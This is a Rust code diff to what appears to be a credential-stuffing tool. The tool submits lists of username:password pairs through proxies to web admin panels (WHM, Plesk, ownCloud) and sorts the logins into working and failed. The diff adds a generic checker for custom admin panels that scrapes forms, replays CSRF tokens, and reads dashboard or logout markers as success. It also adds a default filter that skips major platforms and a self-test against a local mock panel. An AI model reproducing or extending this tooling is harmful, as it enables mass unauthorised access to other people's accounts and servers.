@@ -305,6 +305,260 @@ pub fn is_local_or_private_host(host: &str) -> bool {
         || h.ends_with(".local")
 }
 
+const BIG_PLATFORM_DOMAINS: &[&str] = &[
+    // AI platforms
+    "openai.com",
+    "chatgpt.com",
+    "anthropic.com",
+    "claude.ai",
+    "perplexity.ai",
+    "character.ai",
+    "midjourney.com",
+    "huggingface.co",
+    "poe.com",
+    "deepseek.com",
+    // Meta / Social / Messaging
+    "facebook.com",
+    "fb.com",
+    "fbcdn.net",
+    "messenger.com",
+    "instagram.com",
+    "threads.net",
+    "whatsapp.com",
+    "twitter.com",
+    "x.com",
+    "t.co",
+    "tiktok.com",
+    "snapchat.com",
+    "pinterest.com",
+    "reddit.com",
+    "linkedin.com",
+    "tumblr.com",
+    "discord.com",
+    "discordapp.com",
+    "discord.gg",
+    "telegram.org",
+    "t.me",
+    "vk.com",
+    "ok.ru",
+    "weibo.com",
+    "line.me",
+    "quora.com",
+    "twitch.tv",
+    "patreon.com",
+    "onlyfans.com",
+    "linktr.ee",
+    // Google / Alphabet
+    "google.com",
+    "youtube.com",
+    "youtu.be",
+    "gmail.com",
+    "googleapis.com",
+    "googleusercontent.com",
+    "blogger.com",
+    "blogspot.com",
+    // Microsoft / Apple
+    "microsoft.com",
+    "microsoftonline.com",
+    "live.com",
+    "outlook.com",
+    "hotmail.com",
+    "office.com",
+    "office365.com",
+    "msn.com",
+    "bing.com",
+    "sharepoint.com",
+    "onedrive.com",
+    "azure.com",
+    "xbox.com",
+    "apple.com",
+    "icloud.com",
+    // Gaming & Entertainment
+    "steampowered.com",
+    "steamcommunity.com",
+    "steamgames.com",
+    "epicgames.com",
+    "roblox.com",
+    "minecraft.net",
+    "ea.com",
+    "origin.com",
+    "ubisoft.com",
+    "battle.net",
+    "blizzard.com",
+    "riotgames.com",
+    "leagueoflegends.com",
+    "valorant.com",
+    "playstation.com",
+    "sonyentertainmentnetwork.com",
+    "nintendo.com",
+    "hoyoverse.com",
+    "mihoyo.com",
+    "gog.com",
+    "itch.io",
+    "chess.com",
+    "netflix.com",
+    "spotify.com",
+    "soundcloud.com",
+    "disneyplus.com",
+    "hulu.com",
+    "primevideo.com",
+    "max.com",
+    "crunchyroll.com",
+    "vimeo.com",
+    "dailymotion.com",
+    // E-commerce / Finance / Crypto
+    "amazon.com",
+    "amazonaws.com",
+    "paypal.com",
+    "ebay.com",
+    "aliexpress.com",
+    "alibaba.com",
+    "taobao.com",
+    "tmall.com",
+    "shopee.com",
+    "shopee.co.id",
+    "tokopedia.com",
+    "bukalapak.com",
+    "lazada.com",
+    "lazada.co.id",
+    "blibli.com",
+    "walmart.com",
+    "etsy.com",
+    "shein.com",
+    "temu.com",
+    "stripe.com",
+    "wise.com",
+    "revolut.com",
+    "payoneer.com",
+    "binance.com",
+    "coinbase.com",
+    "kraken.com",
+    "bybit.com",
+    "okx.com",
+    "kucoin.com",
+    "gate.io",
+    "crypto.com",
+    "indodax.com",
+    "blockchain.com",
+    // Big SaaS / Dev / Consumer
+    "github.com",
+    "gitlab.com",
+    "bitbucket.org",
+    "stackoverflow.com",
+    "cloudflare.com",
+    "vercel.com",
+    "netlify.com",
+    "heroku.com",
+    "digitalocean.com",
+    "canva.com",
+    "figma.com",
+    "notion.so",
+    "slack.com",
+    "zoom.us",
+    "trello.com",
+    "asana.com",
+    "dropbox.com",
+    "mega.nz",
+    "mediafire.com",
+    "box.com",
+    "yahoo.com",
+    "aol.com",
+    "proton.me",
+    "protonmail.com",
+    "yandex.com",
+    "yandex.ru",
+    "mail.ru",
+    "wordpress.com",
+    "wix.com",
+    "squarespace.com",
+    "shopify.com",
+    "medium.com",
+    "substack.com",
+    "grammarly.com",
+    "duolingo.com",
+    "coursera.org",
+    "udemy.com",
+    "scribd.com",
+    "academia.edu",
+    "researchgate.net",
+    "adobe.com",
+    "samsung.com",
+    "xiaomi.com",
+    "huawei.com",
+    "opera.com",
+    "mozilla.org",
+];
+
+const BIG_PLATFORM_LABELS: &[&str] = &[
+    "chatgpt",
+    "openai",
+    "facebook",
+    "instagram",
+    "whatsapp",
+    "google",
+    "youtube",
+    "microsoft",
+    "microsoftonline",
+    "tiktok",
+    "twitter",
+    "snapchat",
+    "pinterest",
+    "linkedin",
+    "reddit",
+    "discord",
+    "discordapp",
+    "netflix",
+    "spotify",
+    "steampowered",
+    "steamcommunity",
+    "epicgames",
+    "roblox",
+    "riotgames",
+    "hoyoverse",
+    "mihoyo",
+    "amazon",
+    "paypal",
+    "ebay",
+    "aliexpress",
+    "alibaba",
+    "shopee",
+    "tokopedia",
+    "bukalapak",
+    "lazada",
+    "blibli",
+    "binance",
+    "coinbase",
+    "indodax",
+    "yahoo",
+];
+
+/// True when `host` or `url` belongs to a major consumer / SaaS platform
+/// (ChatGPT/OpenAI, Facebook/Meta, Google, Microsoft, Marketplace, Gaming, etc.)
+/// rather than a custom or self-hosted admin panel.
+pub fn is_big_platform(host: &str, url: &str) -> bool {
+    let h = host.to_ascii_lowercase();
+    for &d in BIG_PLATFORM_DOMAINS {
+        if h == d
+            || (h.len() > d.len()
+                && h.ends_with(d)
+                && h.as_bytes()[h.len() - d.len() - 1] == b'.')
+        {
+            return true;
+        }
+    }
+    for label in h.split('.') {
+        if BIG_PLATFORM_LABELS.contains(&label) {
+            return true;
+        }
+    }
+    let u = url.to_ascii_lowercase();
+    u.contains("chatgpt.com")
+        || u.contains("openai.com")
+        || u.contains("facebook.com")
+        || u.contains("accounts.google.")
+        || u.contains("login.microsoftonline.")
+}
+
 pub fn substr_between<'a>(haystack: &'a str, left: &str, right: &str) -> Option<&'a str> {
     let start = haystack.find(left)? + left.len();
     let end = haystack[start..].find(right)? + start;
@@ -734,8 +988,8 @@ pub fn check_account(
     proxy: Option<(ProxyType, String)>,
     logger: Option<Arc<HttpLogger>>,
 ) -> Result<CheckStatus, String> {
-    if target.username.len() > 32
-        || target.password.len() > 32
+    if target.username.len() > 128
+        || target.password.len() > 128
         || is_local_or_private_host(&target.host)
     {
         return Ok(CheckStatus::Invalid);
@@ -817,7 +1071,7 @@ pub fn check_account(
     } else if html.contains("ownCloud") && html.contains("<body id=\"body-login\"") {
         check_owncloud(&client, target, html, eff_url)
     } else {
-        Ok(CheckStatus::Unknown)
+        check_general_login(&client, target, html, eff_url, &eff_origin)
     }
 }
 
@@ -1528,6 +1782,363 @@ fn check_owncloud(
     Err(format!("Unknown response: {}", resp.effective_url))
 }
 
+/// Extract the value of an HTML attribute (`attr="val"`, `attr='val'`, or `attr=val`)
+/// from a single opening tag `<input ...>` / `<form ...>`, case-insensitively.
+fn extract_tag_attr(tag: &str, attr: &str) -> Option<String> {
+    let lower = tag.to_ascii_lowercase();
+    let needle = format!("{}=", attr.to_ascii_lowercase());
+    let mut search_from = 0;
+    while let Some(rel) = lower[search_from..].find(&needle) {
+        let pos = search_from + rel;
+        let prev_ok = pos == 0
+            || matches!(
+                lower.as_bytes()[pos - 1],
+                b' ' | b'\t' | b'\n' | b'\r' | b'/' | b'"' | b'\''
+            );
+        let val_start = pos + needle.len();
+        search_from = val_start;
+        if !prev_ok || val_start >= tag.len() {
+            continue;
+        }
+        let rest = tag[val_start..].trim_start();
+        if let Some(stripped) = rest.strip_prefix('"') {
+            let end = stripped.find('"')?;
+            return Some(stripped[..end].to_string());
+        } else if let Some(stripped) = rest.strip_prefix('\'') {
+            let end = stripped.find('\'')?;
+            return Some(stripped[..end].to_string());
+        } else {
+            let end = rest
+                .find(|c: char| c.is_whitespace() || c == '>' || c == '/')
+                .unwrap_or(rest.len());
+            return Some(rest[..end].to_string());
+        }
+    }
+    None
+}
+
+fn has_password_input(lower_html: &str) -> bool {
+    lower_html.contains("type=\"password\"")
+        || lower_html.contains("type='password'")
+        || lower_html.contains("type=password")
+}
+
+/// Resolve a `<form action="...">` URL against the page's effective origin and URL.
+fn resolve_form_action(eff_origin: &str, eff_url: &str, action: &str) -> String {
+    let a = action.trim().replace("&amp;", "&");
+    if a.is_empty() || a == "#" || a.to_ascii_lowercase().starts_with("javascript:") {
+        return eff_url.to_string();
+    }
+    if a.starts_with("http://") || a.starts_with("https://") {
+        return a;
+    }
+    if a.starts_with("//") {
+        let scheme = eff_origin.split("://").next().unwrap_or("https");
+        return format!("{}:{}", scheme, a);
+    }
+    if a.starts_with('/') {
+        return format!("{}{}", eff_origin, a);
+    }
+    let clean_eff = eff_url.split('?').next().unwrap_or(eff_url);
+    if a.starts_with('?') {
+        return format!("{}{}", clean_eff, a);
+    }
+    let rel = a.strip_prefix("./").unwrap_or(&a);
+    match clean_eff.rfind('/') {
+        Some(idx) if idx > "https://".len() => format!("{}/{}", &clean_eff[..idx], rel),
+        _ => format!("{}/{}", eff_origin, rel.trim_start_matches('/')),
+    }
+}
+
+/// Generic HTML login checker for custom / self-hosted admin panels not matching
+/// a specific CMS fingerprint.
+///
+/// Locates the `<form>` containing `<input type="password">`, preserves all
+/// hidden / CSRF inputs (plus `<meta name="csrf-token">` and submit button
+/// name/value), submits credentials, and classifies the response.
+fn check_general_login(
+    client: &HttpClient,
+    target: &TargetAccount,
+    html: &str,
+    eff_url: &str,
+    eff_origin: &str,
+) -> Result<CheckStatus, String> {
+    let lower = html.to_ascii_lowercase();
+    if !has_password_input(&lower) {
+        return Ok(CheckStatus::Unknown);
+    }
+
+    // Isolate the <form>...</form> block that holds the password input.
+    let mut form_slice = html;
+    let mut form_open_tag = "";
+    let mut pos = 0;
+    while let Some(f_rel) = lower[pos..].find("<form") {
+        let f_start = pos + f_rel;
+        let f_end = lower[f_start..]
+            .find("</form>")
+            .map(|e| f_start + e + 7)
+            .unwrap_or(html.len());
+        let candidate_lower = &lower[f_start..f_end];
+        if has_password_input(candidate_lower) {
+            form_slice = &html[f_start..f_end];
+            if let Some(gt) = form_slice.find('>') {
+                form_open_tag = &form_slice[..=gt];
+            }
+            break;
+        }
+        pos = f_end;
+    }
+
+    let action = extract_tag_attr(form_open_tag, "action").unwrap_or_default();
+    let post_url = resolve_form_action(eff_origin, eff_url, &action);
+
+    let mut pass_field: Option<String> = None;
+    let mut text_fields: Vec<String> = Vec::new();
+    let mut hidden_fields: Vec<(String, String)> = Vec::new();
+    let mut submit_field: Option<(String, String)> = None;
+
+    let form_lower = form_slice.to_ascii_lowercase();
+    let mut scan = 0;
+    while scan < form_slice.len() {
+        let next_input = form_lower[scan..].find("<input").map(|i| (scan + i, true));
+        let next_btn = form_lower[scan..].find("<button").map(|i| (scan + i, false));
+        let (tag_start, is_input) = match (next_input, next_btn) {
+            (Some(a), Some(b)) => {
+                if a.0 <= b.0 {
+                    a
+                } else {
+                    b
+                }
+            }
+            (Some(a), None) => a,
+            (None, Some(b)) => b,
+            (None, None) => break,
+        };
+        let tag_end = match form_slice[tag_start..].find('>') {
+            Some(e) => tag_start + e + 1,
+            None => break,
+        };
+        let tag = &form_slice[tag_start..tag_end];
+        scan = tag_end;
+
+        let name = match extract_tag_attr(tag, "name") {
+            Some(n) if !n.trim().is_empty() => n,
+            _ => continue,
+        };
+        let val = extract_tag_attr(tag, "value").unwrap_or_default();
+        let t = extract_tag_attr(tag, "type")
+            .unwrap_or_else(|| if is_input { "text".to_string() } else { "submit".to_string() })
+            .to_ascii_lowercase();
+
+        if is_input {
+            match t.as_str() {
+                "password" => {
+                    if pass_field.is_none() {
+                        pass_field = Some(name);
+                    }
+                }
+                "hidden" => {
+                    hidden_fields.push((name, val));
+                }
+                "submit" => {
+                    if submit_field.is_none() {
+                        submit_field = Some((name, val));
+                    }
+                }
+                "text" | "email" | "tel" | "number" | "search" => {
+                    if pass_field.is_none() || text_fields.is_empty() {
+                        text_fields.push(name);
+                    }
+                }
+                _ => {}
+            }
+        } else if t == "submit" && submit_field.is_none() {
+            submit_field = Some((name, val));
+        }
+    }
+
+    let pass_name = pass_field.unwrap_or_else(|| "password".to_string());
+    let user_name = text_fields
+        .iter()
+        .find(|n| {
+            let nl = n.to_ascii_lowercase();
+            [
+                "user", "email", "login", "uname", "account", "admin", "uid", "mail", "nik",
+                "nip", "nim", "pengguna", "id",
+            ]
+            .iter()
+            .any(|k| nl.contains(k))
+        })
+        .cloned()
+        .or_else(|| text_fields.last().cloned())
+        .unwrap_or_else(|| {
+            if target.username.contains('@') {
+                "email".to_string()
+            } else {
+                "username".to_string()
+            }
+        });
+
+    // Meta CSRF token support (Laravel / Rails / custom frameworks)
+    let meta_csrf = substr_between(html, "name=\"csrf-token\" content=\"", "\"")
+        .or_else(|| substr_between(html, "content=\"", "\" name=\"csrf-token\""))
+        .map(|s| s.to_string());
+
+    let mut owned_params: Vec<(String, String)> = Vec::new();
+    for (k, v) in hidden_fields {
+        if k != user_name && k != pass_name {
+            owned_params.push((k, v));
+        }
+    }
+    if let Some(ref csrf) = meta_csrf {
+        if !owned_params
+            .iter()
+            .any(|(k, _)| k == "_token" || k == "csrf_token")
+        {
+            owned_params.push(("_token".to_string(), csrf.clone()));
+        }
+    }
+    owned_params.push((user_name, target.username.clone()));
+    owned_params.push((pass_name, target.password.clone()));
+    if let Some((sk, sv)) = submit_field {
+        if !owned_params.iter().any(|(k, _)| k == &sk) {
+            owned_params.push((sk, sv));
+        }
+    }
+
+    let param_refs: Vec<(&str, &str)> = owned_params
+        .iter()
+        .map(|(k, v)| (k.as_str(), v.as_str()))
+        .collect();
+
+    let mut headers = vec![
+        ("Cache-Control", "max-age=0"),
+        ("Origin", eff_origin),
+        ("Referer", eff_url),
+        ("Accept-Language", "en-US,en;q=0.9,id;q=0.8"),
+    ];
+    if let Some(ref csrf) = meta_csrf {
+        headers.push(("X-CSRF-TOKEN", csrf.as_str()));
+    }
+
+    let resp = client.post_form(&post_url, &headers, &param_refs)?;
+    if resp.status == 401 || resp.status == 403 || resp.status == 422 {
+        return Ok(CheckStatus::Bad("General".to_string()));
+    }
+    if resp.status != 200 {
+        return Err(format!("HTTP {}", resp.status));
+    }
+
+    let resp_trim = resp.body.trim_start();
+    if resp_trim.starts_with('{') {
+        let jl = resp_trim.to_ascii_lowercase().replace(' ', "");
+        if jl.contains("\"success\":false")
+            || jl.contains("\"status\":false")
+            || jl.contains("\"status\":0")
+            || jl.contains("\"status\":\"error\"")
+            || jl.contains("\"status\":\"fail\"")
+            || jl.contains("\"error\":")
+        {
+            return Ok(CheckStatus::Bad("General".to_string()));
+        }
+        if jl.contains("\"success\":true")
+            || jl.contains("\"status\":true")
+            || jl.contains("\"status\":1")
+            || jl.contains("\"status\":\"success\"")
+            || jl.contains("\"status\":\"ok\"")
+            || jl.contains("\"logged_in\":true")
+            || jl.contains("\"authenticated\":true")
+        {
+            return Ok(CheckStatus::Good("General".to_string(), String::new()));
+        }
+    }
+
+    let body_lower = resp.body.to_ascii_lowercase();
+    const ERROR_PHRASES: &[&str] = &[
+        "invalid username",
+        "invalid password",
+        "invalid credentials",
+        "invalid email",
+        "invalid login",
+        "incorrect username",
+        "incorrect password",
+        "wrong username",
+        "wrong password",
+        "authentication failed",
+        "login failed",
+        "user not found",
+        "account not found",
+        "credentials do not match",
+        "bad credentials",
+        "password salah",
+        "kata sandi salah",
+        "username salah",
+        "username atau password",
+        "email atau password",
+        "login gagal",
+        "gagal login",
+        "akun tidak ditemukan",
+        "user tidak ditemukan",
+    ];
+    if ERROR_PHRASES
+        .iter()
+        .any(|p| body_lower.contains(p) && !lower.contains(p))
+    {
+        return Ok(CheckStatus::Bad("General".to_string()));
+    }
+
+    // If the login password field is still rendered on the page, login did not succeed.
+    if has_password_input(&body_lower) {
+        return Ok(CheckStatus::Bad("General".to_string()));
+    }
+
+    if body_lower.contains("page expired") || body_lower.contains("csrf token mismatch") {
+        return Err("CSRF/Page expired".to_string());
+    }
+
+    const LOGOUT_MARKERS: &[&str] = &[
+        "logout",
+        "log-out",
+        "log_out",
+        "signout",
+        "sign-out",
+        "sign_out",
+        ">keluar<",
+        "/keluar",
+    ];
+    const DASHBOARD_MARKERS: &[&str] = &[
+        "dashboard",
+        "control panel",
+        "admin panel",
+        "selamat datang",
+        "welcome,",
+        "my account",
+    ];
+
+    let has_logout = LOGOUT_MARKERS
+        .iter()
+        .any(|m| body_lower.contains(m) && !lower.contains(m));
+    let has_dash = DASHBOARD_MARKERS
+        .iter()
+        .any(|m| body_lower.contains(m) && !lower.contains(m));
+    let url_changed = resp.effective_url.split('?').next() != eff_url.split('?').next();
+
+    if has_logout || (has_dash && (url_changed || !resp.cookies.is_empty())) {
+        let title = substr_between(&resp.body, "<title>", "</title>")
+            .or_else(|| substr_between(&resp.body, "<TITLE>", "</TITLE>"))
+            .map(|t| t.split_whitespace().collect::<Vec<_>>().join(" "))
+            .unwrap_or_default();
+        let extra = if title.is_empty() {
+            String::new()
+        } else {
+            format!(" | Title: {}", title)
+        };
+        return Ok(CheckStatus::Good("General".to_string(), extra));
+    }
+
+    Err(format!("Unknown response: {}", resp.effective_url))
+}
+
 // ============================================================================
 // Engine
 // ============================================================================
@@ -1649,6 +2260,8 @@ pub struct EngineState {
     pub speed_history: Mutex<Vec<u64>>,
     pub results_dir: Mutex<PathBuf>,
     pub file_lock: Mutex<()>,
+    /// Skip big platforms (ChatGPT/OpenAI, Facebook, Google, etc.) locally.
+    pub skip_big_platforms: AtomicBool,
     /// Capture the raw HTTP conversation of every request.
     pub http_logging: AtomicBool,
     pub http_log_limit: AtomicUsize,
@@ -1679,6 +2292,7 @@ impl EngineState {
             speed_history: Mutex::new(vec![0; 30]),
             results_dir: Mutex::new(results_root),
             file_lock: Mutex::new(()),
+            skip_big_platforms: AtomicBool::new(true),
             http_logging: AtomicBool::new(false),
             http_log_limit: AtomicUsize::new(200),
             http_logger: Mutex::new(None),
@@ -1700,16 +2314,26 @@ impl EngineState {
         let mut list = self.accounts.lock().unwrap();
         if clear {
             list.clear();
+            self.rejected.store(0, Ordering::SeqCst);
         }
+        let skip_big = self.skip_big_platforms.load(Ordering::SeqCst);
         for line in content.lines() {
             let raw = line.trim();
             if raw.is_empty() {
                 continue;
             }
-            let valid = TargetAccount::parse(raw).is_some();
+            let parsed = TargetAccount::parse(raw);
+            if skip_big {
+                if let Some(ref t) = parsed {
+                    if is_big_platform(&t.host, &t.url) {
+                        self.rejected.fetch_add(1, Ordering::SeqCst);
+                        continue;
+                    }
+                }
+            }
             list.push(AccountEntry {
                 raw: raw.to_string(),
-                valid,
+                valid: parsed.is_some(),
                 attempts: 0,
             });
         }
@@ -1739,6 +2363,7 @@ impl EngineState {
         {
             let mut list = self.accounts.lock().unwrap();
             list.clear();
+            self.rejected.store(0, Ordering::SeqCst);
         }
 
         loop {
@@ -1757,10 +2382,18 @@ impl EngineState {
             if trimmed.is_empty() {
                 continue;
             }
-            let valid = TargetAccount::parse(trimmed).is_some();
+            let parsed = TargetAccount::parse(trimmed);
+            if self.skip_big_platforms.load(Ordering::Relaxed) {
+                if let Some(ref t) = parsed {
+                    if is_big_platform(&t.host, &t.url) {
+                        self.rejected.fetch_add(1, Ordering::Relaxed);
+                        continue;
+                    }
+                }
+            }
             chunk.push(AccountEntry {
                 raw: trimmed.to_string(),
-                valid,
+                valid: parsed.is_some(),
                 attempts: 0,
             });
             total += 1;
@@ -1909,6 +2542,15 @@ pub fn start_workers(state: Arc<EngineState>) {
                     }
                 };
                 target.attempts = entry.attempts;
+
+                if st.skip_big_platforms.load(Ordering::Relaxed)
+                    && is_big_platform(&target.host, &target.url)
+                {
+                    st.append_result("Invalid.txt", &target.raw);
+                    st.rejected.fetch_add(1, Ordering::SeqCst);
+                    st.checked.fetch_add(1, Ordering::SeqCst);
+                    continue;
+                }
 
                 let proxy_cfg = {
                     let ptype = *st.proxy_type.lock().unwrap();
@@ -2115,6 +2757,16 @@ fn run_self_test() {
     assert!(is_local_or_private_host("10.0.0.5"));
     assert!(!is_local_or_private_host("panel.example.com"));
 
+    // Big platform filter
+    assert!(is_big_platform("chatgpt.com", "https://chatgpt.com/auth/login"));
+    assert!(is_big_platform("auth0.openai.com", "https://auth0.openai.com/u/login"));
+    assert!(is_big_platform("m.facebook.com", "https://m.facebook.com/login.php"));
+    assert!(is_big_platform("accounts.google.co.id", "https://accounts.google.co.id/"));
+    assert!(is_big_platform("shopee.co.id", "https://shopee.co.id/buyer/login"));
+    assert!(is_big_platform("discord.com", "https://discord.com/login"));
+    assert!(!is_big_platform("panel.example.com", "https://panel.example.com/admin"));
+    assert!(!is_big_platform("admin.tokoku.id", "https://admin.tokoku.id/login.php"));
+
     // Plesk JSFuck solver
     assert_eq!(decode_plesk_jsfuck("((+!+[]+!![]+!![])+(+!+[]+[]))"), Some(310));
 
@@ -2254,6 +2906,98 @@ fn run_self_test() {
     let result = check_account(&fallback, None, None).unwrap();
     assert_eq!(result, CheckStatus::Good("WHM".to_string(), String::new()));
 
+    // Live mock-panel check (General custom admin panel: Good & Bad)
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    thread::spawn(move || {
+        for stream in listener.incoming().flatten().take(4) {
+            let mut reader = BufReader::new(&stream);
+            let mut req_line = String::new();
+            let _ = reader.read_line(&mut req_line);
+            let mut clen = 0usize;
+            loop {
+                let mut h = String::new();
+                if reader.read_line(&mut h).is_err() || h == "\r\n" || h.is_empty() {
+                    break;
+                }
+                if let Some((k, v)) = h.split_once(':') {
+                    if k.trim().eq_ignore_ascii_case("content-length") {
+                        clen = v.trim().parse().unwrap_or(0);
+                    }
+                }
+            }
+            let mut body = vec![0u8; clen];
+            let _ = reader.read_exact(&mut body);
+            let body_s = String::from_utf8_lossy(&body);
+            let mut w = stream;
+            if req_line.starts_with("GET ") {
+                let html = "<html><head><title>Custom Panel Login</title></head><body>\
+                    <form action=\"proses_login.php\" method=\"post\">\
+                    <input type=\"hidden\" name=\"csrf_tok\" value=\"sec99\"/>\
+                    <input type=\"text\" name=\"user_admin\"/>\
+                    <input type=\"password\" name=\"pass_admin\"/>\
+                    <button type=\"submit\" name=\"btn_login\" value=\"1\">Masuk</button>\
+                    </form></body></html>";
+                let _ = write!(
+                    w,
+                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
+                    html.len(),
+                    html
+                );
+            } else if body_s.contains("csrf_tok=sec99")
+                && body_s.contains("user_admin=admin")
+                && body_s.contains("pass_admin=rahasia")
+                && body_s.contains("btn_login=1")
+            {
+                let html = "<html><head><title>Dashboard Admin</title></head><body>\
+                    <h1>Selamat Datang</h1><a href=\"/admin/logout.php\">Logout</a></body></html>";
+                let _ = write!(
+                    w,
+                    "HTTP/1.1 200 OK\r\nSet-Cookie: sid=ok123; Path=/\r\nContent-Length: {}\r\n\r\n{}",
+                    html.len(),
+                    html
+                );
+            } else {
+                let html = "<html><head><title>Custom Panel Login</title></head><body>\
+                    <div class=\"alert\">Username atau password salah</div>\
+                    <form action=\"proses_login.php\" method=\"post\">\
+                    <input type=\"text\" name=\"user_admin\"/>\
+                    <input type=\"password\" name=\"pass_admin\"/>\
+                    </form></body></html>";
+                let _ = write!(
+                    w,
+                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
+                    html.len(),
+                    html
+                );
+            }
+        }
+    });
+
+    let gen_good = TargetAccount {
+        raw: format!("http://127.0.0.1:{}/admin/login.php admin:rahasia", port),
+        url: format!("http://127.0.0.1:{}/admin/login.php", port),
+        host: "tokoku.id".to_string(),
+        path: "/admin/login.php".to_string(),
+        origin: format!("http://127.0.0.1:{}", port),
+        username: "admin".to_string(),
+        password: "rahasia".to_string(),
+        implicit_scheme: false,
+        attempts: 0,
+    };
+    let gen_good_res = check_account(&gen_good, None, None).unwrap();
+    assert_eq!(
+        gen_good_res,
+        CheckStatus::Good("General".to_string(), " | Title: Dashboard Admin".to_string())
+    );
+
+    let gen_bad = TargetAccount {
+        password: "wrong".to_string(),
+        ..gen_good
+    };
+    let gen_bad_res = check_account(&gen_bad, None, None).unwrap();
+    assert_eq!(gen_bad_res, CheckStatus::Bad("General".to_string()));
+
     println!("SELF-TEST PASSED: parsers, JSFuck solver, HTML helpers and live panel check verified.");
     println!("C2 implant: absent. HWID collector: absent.");
 }
@@ -2316,6 +3060,12 @@ fn main() {
             }
             "--log-http" => {
                 log_http = true;
+            }
+            "--skip-big-platforms" => {
+                state.skip_big_platforms.store(true, Ordering::SeqCst);
+            }
+            "--no-skip-big-platforms" => {
+                state.skip_big_platforms.store(false, Ordering::SeqCst);
             }
             "--log-limit" if i + 1 < args.len() => {
                 if let Ok(n) = args[i + 1].parse::<usize>() {
